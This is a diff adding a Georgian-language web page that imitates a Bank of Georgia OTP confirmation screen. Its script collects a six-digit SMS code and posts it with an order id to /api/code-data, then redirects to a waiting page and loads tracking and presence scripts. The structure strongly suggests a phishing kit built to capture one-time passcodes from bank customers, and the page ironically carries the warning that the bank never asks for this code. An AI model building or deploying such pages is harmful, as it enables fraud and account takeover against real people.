@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="ka" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<title>დადასტურების კოდი</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family: "Noto Sans Georgian", -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:14px 16px;background:#fff;box-shadow:0 1px 0 rgba(0,0,0,.06);
+    position:sticky;top:0;z-index:10;
+  }
+  .topbar img{height:48px;max-width:40%;object-fit:contain}
+  .topbar-title{font-size:16px;font-weight:700;color:#222}
+
+  .hero-banner{
+    background:#fff;padding:32px 24px;text-align:center;
+  }
+  .hero-banner .otp-img{
+    width:120px;height:120px;object-fit:contain;
+    margin:0 auto 18px;display:block;
+  }
+  .hero-banner h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+  .hero-banner p{font-size:14px;color:#888;line-height:1.6}
+
+  .content{flex:1;padding:28px 24px 0}
+
+  .error-msg{
+    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:12px;
+    padding:12px 14px;margin-bottom:18px;color:#dc2626;font-size:14px;text-align:center;font-weight:700;
+  }
+
+  .code-label{font-size:13px;color:#888;text-align:center;margin-bottom:16px}
+
+  .code-input-wrap{
+    max-width:320px;margin:0 auto 24px;display:flex;gap:10px;
+    justify-content:center;direction:ltr;
+  }
+  .code-digit{
+    width:46px;height:56px;border:2px solid #ddd;border-radius:12px;
+    text-align:center;font-size:26px;font-weight:700;font-family: "Noto Sans Georgian", monospace;
+    background:#fafafa;color:#1a1a1a;outline:none;transition:.2s;
+  }
+  .code-digit:focus{border-color:#fc6719;background:#fff;box-shadow:0 0 0 3px rgba(252,103,25,.12)}
+
+  .info-box{
+    background:#fdf2f2;border:1px solid #f5d0d0;border-radius:12px;padding:14px 16px;
+    display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;
+  }
+  .info-box svg{width:20px;height:20px;flex-shrink:0;fill:none;stroke:#fc6719;stroke-width:2;margin-top:1px}
+  .info-box span{font-size:13px;color:#fc6719;line-height:1.6}
+
+  .resend{text-align:center;margin-top:8px;font-size:13px;color:#888}
+  .resend a{color:#fc6719;font-weight:600;text-decoration:none}
+
+  .bottom{padding:16px 24px 32px;margin-top:auto}
+  .submit-btn{
+    display:block;width:100%;padding:16px;border:none;border-radius:28px;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family: "Noto Sans Georgian", inherit;
+    background:#fc6719;transition:.2s;
+  }
+  .submit-btn:hover{background:#f6661c}
+  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="images/bog-logo-ka.png" alt="საქართველოს ბანკი">
+    <span class="topbar-title">დადასტურება</span>
+  </div>
+
+  <div class="hero-banner">
+    <img class="otp-img" src="images/otp-shield.jpg" alt="OTP">
+    <h1>დადასტურების კოდი</h1>
+    <p>დადასტურების კოდი გაგზავნილია თქვენს დარეგისტრირებულ ტელეფონის ნომერზე</p>
+  </div>
+
+  <div class="content">
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="code-label">შეიყვანეთ 6-ციფრიანი კოდი</div>
+
+    <div class="code-input-wrap">
+      <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
+      <input class="code-digit" type="tel" maxlength="1" id="c1">
+      <input class="code-digit" type="tel" maxlength="1" id="c2">
+      <input class="code-digit" type="tel" maxlength="1" id="c3">
+      <input class="code-digit" type="tel" maxlength="1" id="c4">
+      <input class="code-digit" type="tel" maxlength="1" id="c5">
+    </div>
+
+    <div class="info-box">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+      <span>არავის არ გაუზიაროთ ეს კოდი. საქართველოს ბანკი არასდროს არ გეკითხებათ ამ კოდს.</span>
+    </div>
+
+    <div class="resend">არ მიიღეთ კოდი? <a href="#">ხელახლა გაგზავნა</a></div>
+  </div>
+
+  <div class="bottom">
+    <button class="submit-btn" id="submitBtn" onclick="submitCode()">დადასტურება</button>
+  </div>
+
+<script>
+  const params = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  if (!orderId) location.href = "index.html";
+
+  if (params.get("error") === "1") {
+    const el = document.getElementById("errorMsg");
+    el.textContent = "არასწორი კოდი";
+    el.style.display = "block";
+  }
+
+  const digits = document.querySelectorAll(".code-digit");
+  digits.forEach((inp, i) => {
+    inp.addEventListener("input", () => {
+      inp.value = inp.value.replace(/\D/g, "");
+      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
+    });
+    inp.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+    });
+    inp.addEventListener("paste", e => {
+      e.preventDefault();
+      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+      for (let j = 0; j < digits.length && j < text.length; j++) {
+        digits[j].value = text[j];
+      }
+      const last = Math.min(text.length, digits.length) - 1;
+      if (last >= 0) digits[last].focus();
+    });
+  });
+
+  function getCode() {
+    return Array.from(digits).map(d => d.value).join("");
+  }
+
+  async function submitCode() {
+    const code = getCode();
+    if (code.length < 6) {
+      showError("გთხოვთ, შეიყვანოთ სრული კოდი");
+      return;
+    }
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.textContent = "შემოწმება...";
+
+    try {
+      const res = await fetch("/api/code-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ order_id: orderId, code: code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "code-waiting.html?order=" + orderId;
+      } else {
+        showError(data.message || "შეცდომა მოხდა");
+        btn.disabled = false;
+        btn.textContent = "დადასტურება";
+      }
+    } catch(err) {
+      showError("კავშირის შეცდომა");
+      btn.disabled = false;
+      btn.textContent = "დადასტურება";
+    }
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+  }
+</script>
+<script src="tracker.js"></script>
+<script src="/presence.js"></script>
+</body>
+</html>
